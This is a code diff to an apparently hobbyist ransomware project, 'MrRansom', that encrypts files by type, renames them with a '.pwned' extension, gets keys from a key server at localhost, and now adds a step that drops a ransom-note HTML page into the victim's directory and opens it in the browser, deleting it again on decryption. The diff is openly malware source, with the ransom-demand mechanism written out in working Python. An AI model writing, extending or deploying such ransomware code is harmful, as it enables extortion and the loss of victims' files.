@@ -1,15 +1,21 @@
 import json
 import os
+import shutil
+import webbrowser
 
 import locksmith
 from aldersonalgorithm import AldersonAlgorithm
 from fileutil import get_file, put_file, get_file_bytes_e64, put_file_d64
 
-FILE_TYPES_JSON_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")
+LOCAL_DIR = os.path.dirname(os.path.realpath(__file__))
+
+FILE_TYPES_JSON_PATH = os.path.join(LOCAL_DIR, "file_types.json")
 
 FILE_TYPES = json.loads(get_file(FILE_TYPES_JSON_PATH))["fileTypes"]
 
-ENCRYPTED_EXTENSION = ".pwn"
+ENCRYPTED_EXTENSION = ".pwned"
+
+RANSOM_HTML = "mr-ransom.html"
 
 KEY_SERVER = 'http://localhost:5000'
 
@@ -59,6 +65,8 @@ class MrRansom:
 
             put_file(file_path + ENCRYPTED_EXTENSION, encrypted)
 
+            self.do_payment()
+
     def decrypt(self):
         key = locksmith.get_key(KEY_SERVER, self.root_dir)
 
@@ -69,3 +77,16 @@ class MrRansom:
 
             put_file_d64(file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)], decrypted)
             os.remove(file_path)
+
+            self.clear_payment()
+
+    def do_payment(self):
+        payment_location = os.path.join(LOCAL_DIR, RANSOM_HTML)
+        output_location = os.path.join(self.root_dir, RANSOM_HTML)
+
+        shutil.copyfile(payment_location, output_location)
+
+        webbrowser.open("file://" + output_location)
+
+    def clear_payment(self):
+        os.remove(os.path.join(self.root_dir, RANSOM_HTML))
